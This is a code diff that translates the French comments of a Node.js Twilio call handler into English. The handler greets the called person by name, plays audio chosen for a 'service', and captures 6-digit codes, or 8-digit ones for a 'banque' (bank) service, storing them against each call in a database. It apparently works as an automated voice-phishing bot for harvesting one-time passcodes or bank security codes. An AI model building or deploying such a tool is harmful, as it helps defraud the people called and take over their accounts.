@@ -1,17 +1,17 @@
 module.exports = function(request, response) {
     /**
-     * Fichier contenant les configurations nécéssaires au bon fonctionnement du système
+     * File containing the necessary configurations for the proper functioning of the system
      */
     const config = require('.././config');
 
     /**
-     * Intégration des dépendences SQLITE3
+     * Integration of SQLITE3 dependencies
      */
     const sqlite3 = require('sqlite3').verbose();
     const db = new sqlite3.Database('./db/data.db');
 
     /**
-     * Récupération des variables postées permettant d'ordonner la réponse API en TwiML
+     * Retrieving the posted variables to order the API response in TwiML
      */
     var input = request.body.RecordingUrl || request.body.Digits || 0;
     var callSid = request.body.CallSid;
@@ -23,7 +23,7 @@ module.exports = function(request, response) {
     }
 
     /**
-     * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
+     * Retrieve the service used in this call to return the correct audio to use
      */
     db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
         if (err) {
@@ -31,42 +31,42 @@ module.exports = function(request, response) {
         }
 
         /**
-         * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
-         * Pareil pour le nom de la personne à appeler
+         * If the callSid is not found, use the default audio
+         * Same for the name of the person to call
          */
         var service = row == undefined ? 'default' : row.service;
         var name = row.name == null ? '' : row.name;
-        
 
         /**
-         * Au cas où le callSid est trouvé mais le service n'existe pas, on utilise l'audio par défaut
+         * If the callSid is found but the service does not exist, use the default audio
          */
         if (config[service + 'filepath'] == undefined) service = 'default';
+
         /**
-         * L'on crée ici les url des audios grâce aux données dans le fichier config
+         * Create the audio URLs using the data in the config file
          */
         var endurl = config.serverurl + '/stream/end';
         var askurl = config.serverurl + '/stream/' + service;
         var numdigits = service == 'banque' ? '8' : '6';
 
         /**
-         * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
+         * Create the TwiML response to return, adding the audio URL
          */
         var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
         var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';
 
         /**
-         * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
+         * If the user sent the code, add it to the database and return the end audio: end of the call
          */
         length = service == 'banque' ? 8 : 6;
         if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
             /**
-             * Audio de fin
+             * End audio
              */
             respond(end);
 
             /**
-             * Ajout du code en DB
+             * Add the code to the database
              */
             db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                 if (err) {
@@ -75,7 +75,7 @@ module.exports = function(request, response) {
             });
         } else {
             /**
-             * L'on retourne le TwiML de base pour rejouer l'audio
+             * Return the default TwiML to replay the audio
              */
             respond(ask);
         }
